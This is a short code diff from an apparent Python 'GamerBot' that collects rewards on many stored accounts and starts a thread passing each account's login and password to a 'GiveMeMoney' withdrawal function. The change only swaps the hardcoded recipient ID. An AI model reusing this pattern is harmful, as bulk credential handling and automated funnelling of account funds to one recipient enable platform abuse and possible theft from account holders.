@@ -97,7 +97,7 @@ class GamerBot:
                 print(r.json()['data']['reward']['userSums'])
                 passw = self.shelf_class.all_accs[acc]
                 acc_to_withdraw = [acc, passw]
-                threading.Thread(target=money.GiveMeMoney, args=('101799670376', acc_to_withdraw)).start()
+                threading.Thread(target=money.GiveMeMoney, args=('130062251018', acc_to_withdraw)).start()
             if r.json()['data']['reward']['assets']:
                 self.shelf_class.stat['cards'] += 1
                 self.add_acc_to_file(acc)
